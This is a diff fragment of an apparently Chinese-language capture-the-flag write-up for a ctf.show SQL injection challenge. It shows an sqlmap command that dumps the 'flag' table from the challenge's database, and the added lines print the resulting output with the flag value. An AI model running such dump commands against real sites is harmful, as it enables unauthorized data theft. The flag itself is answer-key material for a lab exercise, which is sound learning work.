@@ -80,3 +80,14 @@ Table: flag
 ````
 
 * 接下来使用直接dump出来: sqlmap -u "http://d96b8b94-0e30-4e6a-810b-caf654fe2b02.challenge.ctf.show/?id=" -D ctfshow -T flag --dump
+
+````
+Database: ctfshow
+Table: flag
+[1 entry]
++----+-----------------------------------------------+
+| id | flag                                          |
++----+-----------------------------------------------+
+| 1  | ctfshow{cd6650cb-4523-49ee-8251-bcbf145e920c} |
++----+-----------------------------------------------+
+````
